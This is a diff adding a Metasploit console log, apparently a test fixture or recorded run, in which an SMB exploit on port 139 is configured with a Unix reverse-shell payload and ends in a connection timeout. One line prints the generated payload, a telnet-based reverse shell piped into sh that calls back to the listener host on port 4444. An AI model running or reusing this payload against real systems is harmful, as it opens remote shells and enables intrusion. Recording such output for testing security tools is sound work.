@@ -1,0 +1,44 @@
+[*] Using configured payload cmd/unix/reverse
+VERBOSE => false
+WfsDelay => 2
+EnableContextEncoding => false
+DisablePayloadHandler => true
+RPORT => 139
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => false
+SSLVersion => Auto
+SSLVerifyMode => PEER
+ConnectTimeout => 10
+TCP::max_send_size => 0
+TCP::send_delay => 0
+NTLM::UseNTLMv2 => true
+NTLM::UseNTLM2_session => true
+NTLM::SendLM => true
+NTLM::UseLMKey => false
+NTLM::SendNTLM => true
+NTLM::SendSPN => true
+SMB::pipe_evasion => false
+SMB::pipe_write_min_size => 1
+SMB::pipe_write_max_size => 1024
+SMB::pipe_read_min_size => 1
+SMB::pipe_read_max_size => 1024
+SMB::pad_data_level => 0
+SMB::pad_file_level => 0
+SMB::obscure_trans_pipe_level => 0
+SMBDirect => true
+SMBUser => 
+SMBPass => 
+SMBDomain => .
+SMBName => *SMBSERVER
+SMB::VerifySignature => false
+SMB::ChunkSize => 500
+SMB::Native_OS => Windows 2000 2195
+SMB::Native_LM => Windows 2000 5.0
+SMB::AlwaysEncrypt => true
+RHOST => 172.16.194.172
+PAYLOAD => cmd/unix/reverse
+LHOST => 172.16.194.163
+TARGET => 0
+[+] sh -c '(sleep 4154|telnet 172.16.194.163 4444|while : ; do sh && break; done 2>&1|telnet 172.16.194.163 4444 >/dev/null 2>&1 &)'
+[*] 172.16.194.172:139 - Use Rex client (SMB1 only) since this module is not compatible with RubySMB client
+[-] 172.16.194.172:139 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (172.16.194.172:139) timed out.
